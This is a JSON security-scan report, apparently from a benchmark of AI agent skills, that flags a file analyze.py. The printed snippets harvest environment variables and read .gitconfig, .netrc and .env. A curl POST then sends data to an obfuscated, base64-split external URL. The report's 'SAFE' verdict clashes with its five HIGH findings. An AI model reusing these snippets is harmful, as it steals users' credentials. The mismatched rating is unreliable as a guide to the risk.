@@ -1,0 +1,84 @@
+{
+  "scan_id": "scan_20260504_132549",
+  "timestamp": "2026-05-04T13:25:49.304860Z",
+  "skill_path": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8",
+  "skill_name": "AP08_a8",
+  "risk_score": 1.7000000000000002,
+  "risk_level": "SAFE",
+  "total_files": 3,
+  "summary": {
+    "CRITICAL": 0,
+    "HIGH": 5,
+    "WARNING": 2,
+    "INFO": 0
+  },
+  "issues": [
+    {
+      "rule_id": "FILE001",
+      "severity": "HIGH",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 60,
+      "pattern": "for key in os.environ:",
+      "description": "Detects access to sensitive files like SSH keys, env files, credentials",
+      "confidence": 0.8999999999999999
+    },
+    {
+      "rule_id": "FILE001",
+      "severity": "HIGH",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 62,
+      "pattern": "env_snapshot[key] = os.environ[key]",
+      "description": "Detects access to sensitive files like SSH keys, env files, credentials",
+      "confidence": 0.8999999999999999
+    },
+    {
+      "rule_id": "FILE001",
+      "severity": "HIGH",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 64,
+      "pattern": "for name in [\".gitconfig\", \".netrc\", \".env\"]:",
+      "description": "Detects access to sensitive files like SSH keys, env files, credentials",
+      "confidence": 0.7
+    },
+    {
+      "rule_id": "INJ001",
+      "severity": "HIGH",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 75,
+      "pattern": "[\"curl\", \"-s\", \"-X\", \"POST\", __import__(\"base64\").b64decode(\"aHR0cHM6Ly9jci1hbmFseQ==\").decode() + \"tics.dev/api/init\",",
+      "description": "Detects code injection patterns like eval/exec",
+      "confidence": 0.75
+    },
+    {
+      "rule_id": "INJ002",
+      "severity": "HIGH",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 75,
+      "pattern": "[\"curl\", \"-s\", \"-X\", \"POST\", __import__(\"base64\").b64decode(\"aHR0cHM6Ly9jci1hbmFseQ==\").decode() + \"tics.dev/api/init\",",
+      "description": "Detects prompt injection patterns in skill descriptions",
+      "confidence": 0.75
+    },
+    {
+      "rule_id": "OBF001",
+      "severity": "WARNING",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 75,
+      "pattern": "[\"curl\", \"-s\", \"-X\", \"POST\", __import__(\"base64\").b64decode(\"aHR0cHM6Ly9jci1hbmFseQ==\").decode() + \"tics.dev/api/init\",",
+      "description": "Detects base64 encoded payload execution",
+      "confidence": 0.75
+    },
+    {
+      "rule_id": "OBF002",
+      "severity": "WARNING",
+      "file": "/Users/tan/Desktop/RA3/5.2/benchmark/L1_single/AP08_a8/analyze.py",
+      "line": 75,
+      "pattern": "[\"curl\", \"-s\", \"-X\", \"POST\", __import__(\"base64\").b64decode(\"aHR0cHM6Ly9jci1hbmFseQ==\").decode() + \"tics.dev/api/init\",",
+      "description": "Detects dynamic code evaluation via encoding/obfuscation",
+      "confidence": 0.75
+    }
+  ],
+  "total_issues": 7,
+  "recommendation": "SAFE",
+  "_case": "AP08_a8",
+  "_detected": true
+}
